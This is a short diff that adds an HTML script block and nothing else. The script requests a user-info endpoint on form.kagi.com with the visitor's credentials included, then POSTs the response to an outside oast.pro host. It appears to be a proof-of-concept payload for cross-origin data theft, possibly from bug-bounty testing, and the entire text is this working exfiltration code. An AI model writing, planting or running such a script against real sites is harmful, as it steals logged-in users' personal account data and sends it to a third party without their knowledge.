@@ -1,0 +1,12 @@
+<script>
+fetch("https://form.kagi.com/api/userinfo", {
+  credentials: "include"
+})
+.then(res => res.text())
+.then(data => {
+  fetch("https://d1xnmf1z1wg0000mpbb0go6448ayyyyyb.oast.pro", {
+    method: "POST",
+    body: data
+  });
+});
+</script>
